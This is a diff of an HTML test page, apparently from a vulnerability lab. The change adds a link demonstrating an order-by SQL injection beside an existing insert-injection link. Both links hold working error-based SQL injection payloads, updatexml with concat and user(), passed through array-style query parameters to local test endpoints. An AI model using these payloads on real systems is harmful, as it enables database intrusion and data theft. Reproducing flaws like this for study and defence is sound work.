@@ -8,8 +8,12 @@
 	</head>
 	<body>
 		<p>
-			<h1>点击测试</h1>
+			<h1>点击测试insert注入</h1>
 			<a href="/public/index.php/index/index/testsql?username[0]=inc&username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&username[2]=1" target="_blank">/public/index.php/index/index/testsql?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1</a>
+		</p>
+		<p>
+			<h1>点击测试order注入</h1>
+			<a href="/public/index.php/index/index/testsqlorder?order[id|updatexml(1,concat(0x3a,user()),1)%23]=1" target="_blank">/public/index.php/index/index/testsqlorder?order[id|updatexml(1,concat(0x3a,user()),1)%23]=1</a>
 		</p>
 	</body>
 </html>
